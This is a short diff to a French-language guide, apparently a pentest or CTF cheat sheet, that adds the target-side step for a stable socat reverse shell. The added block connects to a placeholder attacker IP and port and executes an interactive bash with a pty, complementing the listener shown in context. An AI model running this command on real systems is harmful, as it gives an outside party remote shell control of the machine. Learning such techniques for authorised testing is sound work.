@@ -64,3 +64,10 @@ Pour setup un reverse shell entièrement stable, on va
 user@ip: ~$ socat TCP-L:<port> FILE:`tty`,raw,echo=0
 ```
 
+C'est l'équivalent de faire `stty raw -echo; fg`.
+
+#### 2- Connection -- Machine cible
+
+```shell
+socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
+```
